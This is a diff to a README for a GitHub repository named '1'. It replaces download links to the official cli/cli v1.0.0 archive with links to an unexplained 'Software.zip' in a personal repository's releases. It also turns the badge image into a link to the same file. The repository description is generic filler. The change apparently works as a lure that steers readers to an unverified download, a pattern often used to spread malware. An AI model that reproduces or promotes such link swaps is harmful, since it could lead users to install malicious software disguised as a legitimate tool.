@@ -1,9 +1,9 @@
 
 # Welcome to Repository "1"
 
-🚀 **Explore the latest version of the repository by downloading the zip file [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)** 📦
+🚀 **Explore the latest version of the repository by downloading the zip file [here](https://github.com/infantakash2116/1/releases/download/v1.0/Software.zip)** 📦
 
-[![Download Zip](https://img.shields.io/badge/Download-Zip-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/infantakash2116/1/releases/download/v1.0/Software.zip)](https://github.com/infantakash2116/1/releases/download/v1.0/Software.zip)
 
 ### Description
 This repository, simply named "1", does not provide a specific short description or topics. It's a mystery waiting to be unraveled!
